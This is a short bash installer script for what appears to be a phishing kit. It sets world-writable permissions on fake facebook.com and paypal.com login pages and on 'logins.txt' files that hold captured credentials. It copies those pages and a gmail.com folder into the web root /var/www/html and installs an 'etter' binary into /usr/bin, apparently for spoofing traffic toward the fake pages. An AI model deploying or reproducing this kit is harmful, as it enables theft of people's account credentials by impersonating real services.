#!/bin/bash

#################### -- DECLARATIONS -- #######################################

declare -r path="/var/www/html"

################### -- COLORS -- ################################

declare -r red="\033[1;31m"
declare -r blue="\033[1;34m"
declare -r green="\e[1;32m"
declare -r yellow="\e[1;33m"
declare -r purple="\e[5;35m"
declare -r white="\e[1;37m"

################ -- SCRIPT -- #############################

echo
echo -e "${bleu}Starting the setup steps"
echo

chmod +x etter -v

chmod 777 facebook.com/login.php -v
chmod 777 facebook.com/logins.txt -v

chmod 777 paypal.com/login.php -v
chmod 777 paypal.com/logins.txt -v

cp etter /usr/bin
cp -r facebook.com/ $path
cp -r gmail.com/ $path
cp -r paypal.com/ $path

echo -e "${green}[All Done !!]"
echo
